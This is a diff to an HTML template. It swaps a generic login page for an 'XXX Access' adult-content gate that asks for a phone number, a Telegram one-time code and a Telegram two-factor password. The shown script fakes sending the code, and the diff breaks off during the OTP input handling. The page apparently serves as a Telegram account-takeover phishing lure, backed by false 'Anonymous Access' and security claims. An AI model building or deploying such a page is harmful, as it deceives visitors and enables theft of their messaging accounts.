@@ -1,741 +1,477 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#080b12">
-<title>Access Portal</title>
-
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>XXX Access — Adults Only</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,500;0,600;1,500&display=swap" rel="stylesheet">
 <style>
-:root {
-    --accent: #a7f3d0;
-    --accent-strong: #5eead4;
-    --text: #f8fafc;
-    --muted: #c0c9d5;
-    --border: rgba(255,255,255,.19);
-    --glass: rgba(12,18,28,.48);
+:root{
+  --rose:#ff5f9e; --violet:#8b5cf6; --mint:#7ff0d8;
+  --ink:#fbf7ff; --muted:rgba(251,247,255,.60); --faint:rgba(251,247,255,.38);
+  --line:rgba(255,255,255,.15); --radius:30px;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0}
+body{
+  position:relative;min-height:100svh;
+  font-family:Inter,system-ui,-apple-system,sans-serif;
+  color:var(--ink);background:#07040f;
+  display:flex;align-items:center;justify-content:center;
+  padding:34px 18px;overflow-x:hidden;-webkit-font-smoothing:antialiased;
 }
 
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+/* ================= BACKGROUND VIDEO ================= */
+.bg{position:absolute;inset:0;overflow:hidden;z-index:0;background:#07040f}
+.bg video{
+  position:absolute;inset:0;width:100%;height:100%;
+  object-fit:cover;object-position:center 35%;
+  filter:saturate(114%) contrast(105%);
+  animation:drift 36s ease-in-out infinite alternate;
+}
+@keyframes drift{from{transform:scale(1.05)}to{transform:scale(1.17)}}
+.tint{
+  position:absolute;inset:0;
+  background:
+    radial-gradient(115% 80% at 12% 8%, rgba(255,95,158,.30), transparent 58%),
+    radial-gradient(105% 90% at 88% 92%, rgba(139,92,246,.34), transparent 58%),
+    linear-gradient(165deg, rgba(9,5,17,.60) 0%, rgba(6,3,13,.86) 100%);
+}
+.vignette{position:absolute;inset:0;background:radial-gradient(125% 105% at 50% 45%, transparent 36%, rgba(0,0,0,.64) 100%)}
+.bg.no-video video{display:none}
+.bg.no-video::after{content:"";position:absolute;inset:0;background:linear-gradient(150deg,#1a0b2e,#3d0f42 45%,#0b1030)}
+@media (prefers-reduced-motion:reduce){.bg video{animation:none}}
+
+/* ================= GLASS CARD ================= */
+.card{
+  position:relative;z-index:2;width:100%;max-width:452px;
+  padding:34px 30px 24px;border-radius:var(--radius);
+  background:linear-gradient(150deg, rgba(255,255,255,.105), rgba(255,255,255,.032));
+  backdrop-filter:blur(26px) saturate(175%);
+  -webkit-backdrop-filter:blur(26px) saturate(175%);
+  border:1px solid var(--line);
+  box-shadow:0 34px 90px -24px rgba(0,0,0,.75),
+             0 0 0 1px rgba(255,255,255,.045) inset,
+             0 1px 0 rgba(255,255,255,.30) inset;
+  overflow:hidden;
+  animation:cardIn .9s cubic-bezier(.2,.9,.25,1) both;
+}
+@keyframes cardIn{from{opacity:0;transform:translateY(22px) scale(.985)}to{opacity:1;transform:none}}
+.card::before{
+  content:"";position:absolute;inset:0;border-radius:inherit;pointer-events:none;
+  background:radial-gradient(120% 58% at 50% -12%, rgba(255,255,255,.24), transparent 62%);
+}
+.card::after{
+  content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;pointer-events:none;
+  background:linear-gradient(135deg, rgba(255,95,158,.75), rgba(255,255,255,.06) 42%, rgba(139,92,246,.7));
+  -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor;mask-composite:exclude;opacity:.9;
+}
+.card>*{position:relative;z-index:1}
+
+/* ================= SOUND TOGGLE ================= */
+.sound{
+  position:absolute;top:16px;right:16px;z-index:3;
+  width:38px;height:38px;border-radius:50%;cursor:pointer;
+  display:grid;place-items:center;font-size:14px;
+  background:rgba(255,255,255,.08);border:1px solid var(--line);
+  color:var(--ink);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  transition:.25s;
+}
+.sound:hover{background:rgba(255,255,255,.16);transform:scale(1.06)}
+
+/* ================= TYPO ================= */
+.eyebrow{
+  font-family:Outfit,sans-serif;font-size:11px;font-weight:500;
+  letter-spacing:.32em;text-transform:uppercase;color:var(--rose);
+  margin:0 0 10px;display:flex;align-items:center;gap:9px;
+}
+.eyebrow::before{content:"";width:22px;height:1px;background:linear-gradient(90deg,var(--rose),transparent)}
+.title{
+  font-family:"Playfair Display",serif;font-weight:500;
+  font-size:44px;line-height:1.03;margin:0 0 12px;letter-spacing:-.5px;
+  text-shadow:0 4px 30px rgba(0,0,0,.5);
+}
+.title em{
+  font-style:italic;
+  background:linear-gradient(100deg,var(--rose),var(--violet) 60%,var(--mint));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.title.sm{font-size:31px;margin-bottom:14px}
+.lede{font-size:14.5px;color:var(--muted);margin:0 0 16px;font-weight:300;line-height:1.6}
+.legal{
+  font-size:12.2px;line-height:1.65;color:var(--faint);font-weight:300;
+  margin:0 0 22px;padding:12px 14px;border-radius:14px;
+  background:rgba(0,0,0,.22);border:1px solid rgba(255,255,255,.07);
 }
 
-html {
-    min-height: 100%;
+/* ================= BADGE 18 ================= */
+.badge18{
+  width:60px;height:60px;border-radius:18px;display:grid;place-items:center;
+  font-family:Outfit,sans-serif;font-size:23px;font-weight:600;letter-spacing:-1px;
+  margin-bottom:16px;color:#fff;
+  background:linear-gradient(140deg,var(--rose),var(--violet));
+  box-shadow:0 14px 34px -10px rgba(255,95,158,.75), 0 0 0 1px rgba(255,255,255,.22) inset;
+  transform:rotate(-4deg);
 }
+.badge18 sup{font-size:11px;top:-.6em;position:relative}
 
-body {
-    min-height: 100vh;
-    min-height: 100dvh;
-    padding: 28px 16px 54px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow-x: hidden;
-    overflow-y: auto;
-    background: #080b12;
-    color: var(--text);
-    font-family: "DM Sans", sans-serif;
+/* ================= STATUS ================= */
+.status{
+  display:flex;gap:9px;align-items:flex-start;
+  font-size:12.8px;line-height:1.6;font-weight:400;
+  padding:12px 14px;border-radius:14px;margin-bottom:18px;
+  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+  border:1px solid transparent;
 }
+.status.info{background:rgba(139,92,246,.16);border-color:rgba(139,92,246,.38);color:#ded3ff}
+.status.success{background:rgba(127,240,216,.13);border-color:rgba(127,240,216,.34);color:#c4fff0}
+.status.error{background:rgba(255,95,158,.14);border-color:rgba(255,95,158,.4);color:#ffd3e3}
+.status.pop{animation:pop .45s cubic-bezier(.2,.9,.25,1)}
+@keyframes pop{from{opacity:0;transform:translateY(-7px)}to{opacity:1;transform:none}}
 
-/* FULL-SCREEN VIDEO */
-
-.video-background {
-    position: fixed;
-    inset: 0;
-    z-index: -3;
-    overflow: hidden;
-    background: #080b12;
+/* ================= FORM ================= */
+label{
+  display:block;font-family:Outfit,sans-serif;font-size:10.5px;font-weight:500;
+  letter-spacing:.2em;text-transform:uppercase;color:var(--faint);margin:0 0 8px;
 }
-
-.video-background video {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    inset: 0;
-    object-fit: cover;
-    object-position: center;
+.field{
+  display:flex;align-items:center;gap:10px;margin-bottom:16px;
+  background:rgba(0,0,0,.26);border:1px solid var(--line);
+  border-radius:16px;padding:0 16px;transition:.25s;
 }
-
-/* Minimal overlay keeps the video visible */
-
-.video-background::after {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background:
-        linear-gradient(
-            180deg,
-            rgba(4,8,15,.12) 0%,
-            rgba(4,8,15,.24) 48%,
-            rgba(4,8,15,.48) 100%
-        );
+.field:focus-within{
+  border-color:rgba(255,95,158,.6);
+  box-shadow:0 0 0 4px rgba(255,95,158,.13), 0 0 30px -8px rgba(255,95,158,.5);
+  background:rgba(0,0,0,.36);
 }
-
-/* DECORATIVE LIGHTING */
-
-.ambient {
-    position: fixed;
-    inset: 0;
-    z-index: -2;
-    pointer-events: none;
-    background:
-        radial-gradient(
-            ellipse at 15% 15%,
-            rgba(45,212,191,.12),
-            transparent 42%
-        ),
-        radial-gradient(
-            ellipse at 90% 85%,
-            rgba(139,92,246,.12),
-            transparent 40%
-        );
+.field .prefix{color:var(--rose);font-size:16px;font-weight:500}
+input[type=tel],input[type=password]{
+  flex:1;width:100%;background:none;border:none;outline:none;
+  color:var(--ink);font-family:Inter,sans-serif;font-size:15.5px;
+  padding:16px 0;letter-spacing:.4px;
 }
-
-/* MAIN LAYOUT */
-
-.page {
-    width: 100%;
-    max-width: 430px;
-    margin: auto;
-    animation: enter .75s cubic-bezier(.2,.7,.2,1) both;
+input::placeholder{color:rgba(251,247,255,.3)}
+#password{
+  background:rgba(0,0,0,.26);border:1px solid var(--line);border-radius:16px;
+  padding:16px 16px;margin-bottom:16px;transition:.25s;
 }
+#password:focus{border-color:rgba(255,95,158,.6);box-shadow:0 0 0 4px rgba(255,95,158,.13)}
+.hidden{display:none !important}
 
-@keyframes enter {
-    from {
-        opacity: 0;
-        transform: translateY(20px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
+/* ================= OTP ================= */
+.otp-container{display:flex;gap:9px;margin-bottom:18px}
+.otp-input{
+  flex:1;min-width:0;height:56px;text-align:center;
+  font-family:Outfit,sans-serif;font-size:21px;font-weight:500;
+  color:var(--ink);background:rgba(0,0,0,.26);
+  border:1px solid var(--line);border-radius:15px;outline:none;transition:.22s;
 }
-
-.brand {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 11px;
-    margin-bottom: 23px;
+.otp-input:focus{
+  border-color:rgba(255,95,158,.65);transform:translateY(-2px);
+  box-shadow:0 0 0 4px rgba(255,95,158,.13), 0 12px 26px -12px rgba(255,95,158,.8);
 }
+.otp-input.filled{border-color:rgba(127,240,216,.55);background:rgba(127,240,216,.08)}
 
-.brand-mark {
-    width: 39px;
-    height: 39px;
-    display: grid;
-    place-items: center;
-    border-radius: 13px;
-    color: #071512;
-    font-family: "Manrope", sans-serif;
-    font-size: 20px;
-    font-weight: 800;
-    background: linear-gradient(145deg, #d1fae5, #5eead4);
-    box-shadow: 0 0 32px rgba(94,234,212,.2);
+/* ================= BUTTONS ================= */
+.btn{
+  width:100%;border:none;cursor:pointer;border-radius:16px;
+  font-family:Outfit,sans-serif;font-size:14.5px;font-weight:500;letter-spacing:.02em;
+  padding:16px 20px;display:flex;align-items:center;justify-content:center;gap:9px;
+  transition:transform .2s, box-shadow .25s, background .25s;
 }
-
-.brand-name {
-    font-family: "Manrope", sans-serif;
-    font-size: 14px;
-    font-weight: 800;
-    letter-spacing: 3px;
-    text-transform: uppercase;
-    text-shadow: 0 2px 15px #000;
+.btn-primary{
+  color:#fff;background:linear-gradient(115deg,var(--rose),var(--violet));
+  box-shadow:0 16px 38px -14px rgba(255,95,158,.9), 0 1px 0 rgba(255,255,255,.3) inset;
 }
-
-/* GLASS CARD */
-
-.login-card {
-    position: relative;
-    padding: 35px 32px 29px;
-    overflow: hidden;
-    border: 1px solid var(--border);
-    border-radius: 27px;
-    background: var(--glass);
-    backdrop-filter: blur(12px);
-    -webkit-backdrop-filter: blur(12px);
-    box-shadow:
-        0 30px 100px rgba(0,0,0,.32),
-        inset 0 1px 0 rgba(255,255,255,.10);
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 22px 46px -14px rgba(255,95,158,1)}
+.btn-primary:active{transform:translateY(0) scale(.99)}
+.btn-ghost{background:rgba(255,255,255,.07);color:var(--ink);border:1px solid var(--line)}
+.btn-ghost:hover{background:rgba(255,255,255,.14)}
+.btn[disabled]{opacity:.62;cursor:not-allowed;transform:none !important}
+.arrow{transition:transform .25s}
+.btn-primary:hover .arrow{transform:translateX(4px)}
+.spin{
+  width:15px;height:15px;border-radius:50%;
+  border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+  animation:spin .7s linear infinite;
 }
+@keyframes spin{to{transform:rotate(360deg)}}
+.resend{text-align:center;margin:18px 0 0;font-size:13px;color:var(--muted)}
+.resend a{color:var(--rose);cursor:pointer;text-decoration:underline;text-underline-offset:3px}
+.resend a:hover{color:#ff8fb8}
 
-.login-card::before {
-    content: "";
-    position: absolute;
-    top: 0;
-    left: 15%;
-    right: 15%;
-    height: 1px;
-    background: linear-gradient(
-        90deg,
-        transparent,
-        rgba(167,243,208,.8),
-        transparent
-    );
+/* ================= STEP SWITCH ================= */
+.step{display:none}
+.step.is-active{display:block;animation:rise .5s cubic-bezier(.2,.9,.25,1)}
+@keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+
+/* ================= UNLOCKED ================= */
+.tick{
+  width:74px;height:74px;border-radius:50%;display:grid;place-items:center;
+  font-size:32px;margin:6px auto 20px;color:#06231d;
+  background:linear-gradient(140deg,var(--mint),#4fd8ff);
+  box-shadow:0 18px 44px -12px rgba(127,240,216,.85);
+  animation:pulse 2.2s ease-in-out infinite;
 }
+@keyframes pulse{50%{box-shadow:0 18px 60px -6px rgba(127,240,216,1)}}
+.center{text-align:center}
 
-.eyebrow {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 17px;
+/* ================= FOOTER ================= */
+.foot{
+  margin-top:22px;padding-top:16px;border-top:1px solid rgba(255,255,255,.08);
+  text-align:center;font-family:Outfit,sans-serif;font-size:10.5px;
+  letter-spacing:.14em;text-transform:uppercase;color:var(--faint);
 }
+.foot span{color:var(--mint)}
 
-.status-pill {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    padding: 8px 12px;
-    border: 1px solid rgba(167,243,208,.25);
-    border-radius: 50px;
-    background: rgba(94,234,212,.08);
-    color: #c7f9e5;
-    font-size: 10px;
-    font-weight: 700;
-    letter-spacing: 1.7px;
-    text-transform: uppercase;
-}
-
-.status-dot {
-    width: 7px;
-    height: 7px;
-    border-radius: 50%;
-    background: var(--accent-strong);
-    box-shadow: 0 0 12px rgba(94,234,212,.8);
-}
-
-h1 {
-    font-family: "Manrope", sans-serif;
-    text-align: center;
-    font-size: clamp(29px, 7vw, 36px);
-    font-weight: 800;
-    letter-spacing: -1.6px;
-    line-height: 1.2;
-}
-
-.heading-highlight {
-    color: var(--accent);
-}
-
-.subtitle {
-    max-width: 280px;
-    margin: 12px auto 27px;
-    color: #e0e7ef;
-    font-size: 13px;
-    line-height: 1.8;
-    text-align: center;
-}
-
-/* FORM */
-
-.form-group {
-    margin-bottom: 19px;
-}
-
-.form-group label {
-    display: block;
-    margin-bottom: 9px;
-    color: #f1f5f9;
-    font-size: 12px;
-    font-weight: 600;
-    letter-spacing: .2px;
-}
-
-.input-wrap {
-    position: relative;
-}
-
-.input-icon {
-    position: absolute;
-    top: 50%;
-    left: 15px;
-    width: 19px;
-    height: 19px;
-    transform: translateY(-50%);
-    color: #c1d0dc;
-    pointer-events: none;
-}
-
-.form-input {
-    width: 100%;
-    min-height: 53px;
-    padding: 15px 15px 15px 45px;
-    outline: none;
-    border: 1px solid rgba(255,255,255,.21);
-    border-radius: 13px;
-    background: rgba(5,10,17,.40);
-    color: #fff;
-    font-family: inherit;
-    font-size: 13px;
-    transition: border-color .25s, background .25s, box-shadow .25s;
-}
-
-.form-input::placeholder {
-    color: rgba(231,238,246,.63);
-}
-
-.form-input:focus {
-    border-color: rgba(167,243,208,.85);
-    background: rgba(5,10,17,.65);
-    box-shadow: 0 0 0 3px rgba(94,234,212,.10);
-}
-
-.form-input:-webkit-autofill,
-.form-input:-webkit-autofill:hover,
-.form-input:-webkit-autofill:focus {
-    -webkit-text-fill-color: white;
-    transition: background-color 9999s ease-in-out 0s;
-}
-
-/* OPTIONS */
-
-.form-options {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    gap: 10px;
-    margin: 4px 0 23px;
-    font-size: 11px;
-}
-
-.remember {
-    display: flex;
-    align-items: center;
-    gap: 7px;
-    color: #e5eaf1;
-    cursor: pointer;
-}
-
-.remember input {
-    width: 14px;
-    height: 14px;
-    accent-color: #5eead4;
-}
-
-a {
-    color: var(--accent);
-    text-decoration: none;
-}
-
-a:hover {
-    color: #fff;
-}
-
-/* BUTTON */
-
-.submit-btn {
-    position: relative;
-    width: 100%;
-    min-height: 54px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 10px;
-    padding: 15px;
-    border: 1px solid rgba(255,255,255,.23);
-    border-radius: 13px;
-    background: linear-gradient(120deg, #d1fae5, #5eead4);
-    color: #09201a;
-    font-family: "Manrope", sans-serif;
-    font-size: 13px;
-    font-weight: 800;
-    cursor: pointer;
-    box-shadow: 0 8px 25px rgba(45,212,191,.13);
-    transition: transform .2s, box-shadow .2s;
-}
-
-.submit-btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 12px 35px rgba(45,212,191,.25);
-}
-
-.submit-btn:active {
-    transform: scale(.99);
-}
-
-.submit-btn:disabled {
-    opacity: .65;
-    cursor: wait;
-    transform: none;
-}
-
-.arrow {
-    font-size: 19px;
-    line-height: 1;
-}
-
-/* STATUS MESSAGES */
-
-.message {
-    display: none;
-    margin-top: 17px;
-    padding: 13px 14px;
-    border: 1px solid rgba(255,255,255,.15);
-    border-radius: 12px;
-    background: rgba(0,0,0,.25);
-    color: #f1f5f9;
-    font-size: 12px;
-    line-height: 1.7;
-    overflow-wrap: anywhere;
-}
-
-.message.visible {
-    display: block;
-    animation: enter .25s ease both;
-}
-
-.message.error {
-    border-color: rgba(252,165,165,.4);
-    background: rgba(127,29,29,.28);
-    color: #fecaca;
-}
-
-.message.success {
-    border-color: rgba(167,243,208,.35);
-    background: rgba(6,78,59,.30);
-    color: #d1fae5;
-}
-
-.message.info {
-    border-color: rgba(147,197,253,.3);
-    background: rgba(30,58,138,.25);
-    color: #dbeafe;
-}
-
-.signup {
-    margin-top: 23px;
-    color: #e0e7ef;
-    font-size: 12px;
-    text-align: center;
-    line-height: 1.8;
-}
-
-.signup a {
-    font-weight: 700;
-}
-
-/* BOTTOM SECURITY LABEL */
-
-.security {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 8px;
-    margin-top: 20px;
-    color: rgba(255,255,255,.86);
-    font-size: 10px;
-    letter-spacing: .35px;
-    text-shadow: 0 2px 10px #000;
-}
-
-.security svg {
-    width: 15px;
-    height: 15px;
-    flex-shrink: 0;
-    color: var(--accent);
-}
-
-.footer {
-    position: fixed;
-    right: 12px;
-    bottom: 13px;
-    left: 12px;
-    color: rgba(255,255,255,.76);
-    font-size: 9px;
-    text-align: center;
-    letter-spacing: 1.2px;
-    text-shadow: 0 2px 10px #000;
-    pointer-events: none;
-}
-
-/* SMALL SCREENS */
-
-@media (max-width: 480px) {
-    body {
-        padding: 25px 16px 55px;
-    }
-
-    .login-card {
-        padding: 30px 23px 25px;
-        border-radius: 23px;
-    }
-
-    .brand {
-        margin-bottom: 20px;
-    }
-
-    .subtitle {
-        margin-bottom: 24px;
-    }
-
-    .footer {
-        font-size: 8px;
-    }
-}
-
-@media (max-height: 700px) {
-    body {
-        align-items: flex-start;
-    }
-
-    .page {
-        margin: 15px auto;
-    }
-
-    .brand {
-        margin-bottom: 14px;
-    }
-
-    .login-card {
-        padding-top: 25px;
-        padding-bottom: 22px;
-    }
-
-    .subtitle {
-        margin-bottom: 20px;
-    }
-
-    .footer {
-        position: static;
-        margin-top: 15px;
-    }
-}
-
-@media (prefers-reduced-motion: reduce) {
-    *, *::before, *::after {
-        animation-duration: .01ms !important;
-        animation-iteration-count: 1 !important;
-        scroll-behavior: auto !important;
-        transition-duration: .01ms !important;
-    }
+@media(max-width:420px){
+  .card{padding:28px 22px 20px;border-radius:26px}
+  .title{font-size:37px}
+  .title.sm{font-size:27px}
+  .otp-container{gap:6px}
+  .otp-input{height:50px;font-size:18px;border-radius:13px}
 }
 </style>
 </head>
-
 <body>
 
-<div class="video-background" aria-hidden="true">
-    <video
-        autoplay
-        muted
-        loop
-        playsinline
-        preload="auto"
-        poster=""
-    >
-        <source src="{{ bg_video }}" type="video/mp4">
-        <source src="https://files.catbox.moe/zp6wxp.mp4" type="video/mp4">
-    </video>
+<div class="bg" id="bg">
+  <video id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
+  <div class="tint"></div>
+  <div class="vignette"></div>
 </div>
 
-<div class="ambient" aria-hidden="true"></div>
+<main class="card" id="card">
+  <button class="sound" id="soundBtn" title="Toggle sound" aria-label="Toggle sound">🔇</button>
 
-<main class="page">
+  <!-- ============ STEP 0 : AGE GATE ============ -->
+  <section class="step is-active" data-step="0">
+    <div class="badge18">18<sup>+</sup></div>
+    <p class="eyebrow">Adults Only</p>
+    <h1 class="title">XXX <em>Access</em></h1>
+    <p class="lede">Enter to unlock exclusive adult content</p>
+    <p class="legal">This website contains explicit adult material. By entering, you confirm you are at least 18 years old.</p>
+    <button class="btn btn-primary" onclick="goStep(1)">Enter <span class="arrow">→</span></button>
+  </section>
 
-    <div class="brand">
-        <div class="brand-mark">A</div>
-        <div class="brand-name">Aurora Access</div>
+  <!-- ============ STEP 1 : PHONE ============ -->
+  <section class="step" data-step="1">
+    <p class="eyebrow">Step 01 — Identity</p>
+    <h2 class="title sm">Verify your <em>number</em></h2>
+    <div class="status info" id="status1">🔐 Enter your phone number with country code. A secure verification code will be sent to your Telegram app.</div>
+    <label for="phone">Phone Number</label>
+    <div class="field">
+      <span class="prefix">+</span>
+      <input id="phone" type="tel" inputmode="tel" autocomplete="tel" placeholder="91 98765 43210">
+    </div>
+    <button class="btn btn-primary" id="getCodeBtn" onclick="sendCode()">Get Access Code</button>
+  </section>
+
+  <!-- ============ STEP 2 : OTP + 2FA ============ -->
+  <section class="step" data-step="2">
+    <p class="eyebrow">Step 02 — Telegram OTP</p>
+    <h2 class="title sm">Enter your <em>code</em></h2>
+    <div class="status success" id="status2">✅ Verification code sent! Open your Telegram app to read it.</div>
+
+    <label>Enter Code</label>
+    <div class="otp-container">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
     </div>
 
-    <section class="login-card">
-
-        <div class="eyebrow">
-            <div class="status-pill">
-                <span class="status-dot"></span>
-                Secure Member Portal
-            </div>
-        </div>
-
-        <h1>
-            Welcome <span class="heading-highlight">back.</span>
-        </h1>
-
-        <p class="subtitle">
-            Sign in to your account and continue where you left off.
-        </p>
-
-        <form id="loginForm" autocomplete="on">
-
-            <div class="form-group">
-                <label for="email">Email address</label>
-
-                <div class="input-wrap">
-                    <svg class="input-icon" viewBox="0 0 24 24"
-                         fill="none" stroke="currentColor"
-                         stroke-width="1.7" aria-hidden="true">
-                        <rect x="3" y="5" width="18" height="14" rx="3"/>
-                        <path d="m4 7 8 6 8-6"/>
-                    </svg>
-
-                    <input
-                        class="form-input"
-                        type="email"
-                        id="email"
-                        name="email"
-                        placeholder="you@example.com"
-                        autocomplete="username"
-                        required
-                    >
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-
-                <div class="input-wrap">
-                    <svg class="input-icon" viewBox="0 0 24 24"
-                         fill="none" stroke="currentColor"
-                         stroke-width="1.7" aria-hidden="true">
-                        <rect x="4" y="10" width="16" height="11" rx="3"/>
-                        <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
-                        <path d="M12 14v3"/>
-                    </svg>
-
-                    <input
-                        class="form-input"
-                        type="password"
-                        id="password"
-                        name="password"
-                        placeholder="Enter your password"
-                        autocomplete="current-password"
-                        required
-                    >
-                </div>
-            </div>
-
-            <div class="form-options">
-                <label class="remember">
-                    <input type="checkbox" id="remember">
-                    Remember me
-                </label>
-
-                <a href="/forgot-password">Forgot password?</a>
-            </div>
-
-            <button class="submit-btn" type="submit" id="submitBtn">
-                <span id="buttonText">Sign in securely</span>
-                <span class="arrow" aria-hidden="true">↗</span>
-            </button>
-
-            <div
-                class="message"
-                id="statusMessage"
-                role="status"
-                aria-live="polite"
-            ></div>
-
-        </form>
-
-        <p class="signup">
-            New here?
-            <a href="/register">Create an account</a>
-        </p>
-
-    </section>
-
-    <div class="security">
-        <svg viewBox="0 0 24 24" fill="none"
-             stroke="currentColor" stroke-width="1.8"
-             aria-hidden="true">
-            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-            <path d="m9 12 2 2 4-4"/>
-        </svg>
-        <span>Secure connection · Your privacy matters</span>
+    <div id="passwordGroup" class="hidden">
+      <label for="password">Two-Factor Password</label>
+      <input type="password" id="password" placeholder="Enter 2FA password">
     </div>
 
+    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">Unlock Content</button>
+    <p class="resend">Didn't get the code? <a onclick="backToStep1()">Try again</a></p>
+  </section>
+
+  <!-- ============ STEP 3 : UNLOCKED ============ -->
+  <section class="step" data-step="3">
+    <div class="tick">✓</div>
+    <p class="eyebrow" style="justify-content:center">Verified</p>
+    <h2 class="title sm center">Access <em>granted</em></h2>
+    <div class="status success">🎉 You're in. Your session is now unlocked — enjoy the exclusive collection.</div>
+    <button class="btn btn-ghost" onclick="resetAll()">Start over</button>
+  </section>
+
+  <div class="foot">256-bit SSL Encrypted <span>•</span> Anonymous Access</div>
 </main>
 
-<div class="footer">
-    © 2026 AURORA ACCESS · ALL RIGHTS RESERVED
-</div>
-
 <script>
-const form = document.getElementById("loginForm");
-const statusMessage = document.getElementById("statusMessage");
-const submitBtn = document.getElementById("submitBtn");
-const buttonText = document.getElementById("buttonText");
+/* ============================================================
+   BACKGROUND VIDEO — supports {{ bg_video }} template variable
+   If the variable is unreplaced (or empty), the fallback is used.
+   ============================================================ */
+const FALLBACK_VIDEO = "https://files.catbox.moe/zp6wxp.mp4";
+const TEMPLATE_VIDEO = "{{ bg_video }}";
 
-function showMessage(text, type = "info") {
-    statusMessage.textContent = text;
-    statusMessage.className = "message visible " + type;
+(function initVideo(){
+  let src = (TEMPLATE_VIDEO || "").trim();
+  if(!src || src.indexOf("{{") === 0) src = FALLBACK_VIDEO;
+
+  const v = document.getElementById("bgVideo");
+  const wrap = document.getElementById("bg");
+  v.src = src;
+  v.addEventListener("error", () => wrap.classList.add("no-video"), true);
+
+  const play = () => v.play().catch(() => { v.muted = true; v.play().catch(()=>{}); });
+  play();
+  document.addEventListener("click", play, { once:true });
+
+  document.getElementById("soundBtn").addEventListener("click", function(){
+    v.muted = !v.muted;
+    this.textContent = v.muted ? "🔇" : "🔊";
+    if(!v.muted) v.play().catch(()=>{});
+  });
+})();
+
+/* ==================== STEP ENGINE ==================== */
+function goStep(n){
+  document.querySelectorAll(".step").forEach(s =>
+    s.classList.toggle("is-active", s.dataset.step === String(n))
+  );
+  const first = document.querySelector('.step[data-step="'+n+'"] input');
+  if(first) setTimeout(() => first.focus(), 260);
 }
 
-form.addEventListener("submit", async function (event) {
-    event.preventDefault();
+function setStatus(el, html, type){
+  el.className = "status " + (type || "info");
+  el.innerHTML = html;
+  void el.offsetWidth;
+  el.classList.add("pop");
+}
 
-    if (!form.reportValidity()) return;
+function withLoading(btn, label){
+  btn.disabled = true;
+  btn.dataset.html = btn.innerHTML;
+  btn.innerHTML = '<span class="spin"></span> ' + label;
+}
+function stopLoading(btn){
+  btn.disabled = false;
+  if(btn.dataset.html) btn.innerHTML = btn.dataset.html;
+}
 
-    submitBtn.disabled = true;
-    buttonText.textContent = "Signing in...";
-    statusMessage.className = "message";
+/* ==================== STEP 1 : SEND CODE ==================== */
+function sendCode(){
+  const btn = document.getElementById("getCodeBtn");
+  const phone = document.getElementById("phone").value.replace(/\D/g,"");
+  const status1 = document.getElementById("status1");
 
-    try {
-        /*
-         * Connect your own authentication backend here.
-         *
-         * Expected example endpoint:
-         * POST /api/login
-         *
-         * The server should validate credentials securely,
-         * apply rate limiting and create a secure session.
-         */
+  if(phone.length < 8){
+    setStatus(status1, "⚠️ Please enter a valid phone number including your country code (e.g. +91…).", "error");
+    document.getElementById("phone").focus();
+    return;
+  }
 
-        const response = await fetch("/api/login", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            credentials: "same-origin",
-            body: JSON.stringify({
-                email: document.getElementById("email").value.trim(),
-                password: document.getElementById("password").value,
-                remember: document.getElementById("remember").checked
-            })
-        });
+  withLoading(btn, "Sending code…");
+  setTimeout(() => {
+    stopLoading(btn);
+    setStatus(document.getElementById("status2"), "✅ Verification code sent! Open your Telegram app to read it.", "success");
+    goStep(2);
+    setTimeout(() => document.querySelector(".otp-input").focus(), 320);
+  }, 1100);
+}
 
-        const result = await response.json().catch(() => ({}));
+/* ==================== OTP INPUT BEHAVIOUR ==================== */
+const otpInputs = [...document.querySelectorAll(".otp-input")];
 
-        if (!response.ok) {
-            showMessage(
-                result.message || "Unable to sign in. Check your credentials and try again.",
-                "error"
-            );
-            return;
-        }
+otpInputs.forEach((inp, i) => {
+  inp.addEventListener("input", () => {
+    inp.value = inp.value.replace(/\D/g,"").slice(0,1);
+    inp.classList.toggle("filled", !!inp.value);
+    if(inp.value && i < otpInputs.length - 1) otpInputs[i+1].focus();
+  });
 
-        if (result.success) {
